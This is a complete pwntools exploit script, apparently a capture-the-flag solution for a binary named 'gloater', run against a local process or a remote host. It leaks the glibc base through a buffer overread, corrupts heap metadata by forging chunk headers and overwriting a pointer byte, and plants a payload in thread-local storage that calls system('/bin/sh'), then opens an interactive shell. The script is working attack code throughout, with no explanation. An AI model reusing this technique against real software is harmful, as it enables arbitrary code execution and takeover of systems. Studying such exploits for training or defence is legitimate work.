#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64

context.binary = 'gloater'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process(level='DEBUG')

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def update_current_user(username: bytes) -> bytes:
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'New User: ', username)
    return io.recvuntil(b'\nUpdated', drop=True)


def create_new_taunt(target: bytes, taunt: bytes):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'Taunt target: ', target)
    io.sendafter(b'Taunt: ', taunt)


def remove_taunt(index: int):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())


def set_super_taunt(index: int, plague: bytes) -> bytes:
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index for Super Taunt: ', str(index).encode())
    io.sendafter(b'Plague to accompany the super taunt: ', plague)
    io.recvuntil(b'Plague entered: ')
    return io.recvuntil(b'\nRegistered', drop=True)


def main():
    io.sendlineafter(b'> ', b'asdf')

    create_new_taunt(b'qwer', p64(0) + p64(0x181) + b'A' * 0x20 + p64(0)) 
    create_new_taunt(b'A' * 8, b'B' * 0x118) 
    create_new_taunt(b'A' * 8, b'B' * 0x118) 

    glibc.address = u64(set_super_taunt(0, b'A' * 136)[136:].ljust(8, b'\0')) - glibc.sym.puts
    tls_addr = glibc.address + 0x1f3540
    io.success(f'Glibc base address: {hex(glibc.address)}')

    update_current_user(b'A' * 4 + b'\xe0')

    remove_taunt(0)
    remove_taunt(2)
    remove_taunt(1)

    create_new_taunt(b'C' * 8, (b'D' * 40 + p64(0x31) + b'A' * 40 + p64(0x121) + p64(tls_addr - 0x80 + 0x28)).ljust(0x178, b'A'))

    create_new_taunt(b'A' * 8, b'B' * 0x118) 

    tls_payload  = p64(tls_addr - 0x80 + 0x30)
    tls_payload += p64(glibc.sym.system << 17)
    tls_payload += p64(next(glibc.search(b'/bin/sh')))
    tls_payload += p64(0) * 8
    tls_payload += p64(glibc.address + 0x1f3540)
    tls_payload += p64(glibc.address + 0x1f3ea0)
    tls_payload += p64(glibc.address + 0x1f3540)
    tls_payload += p64(0) * 4

    create_new_taunt(b'A' * 8, tls_payload.ljust(0x118, b'\0')) 
    io.sendlineafter(b'> ', b'6')

    io.interactive()


if __name__ == '__main__':
    io = get_process()
    main()
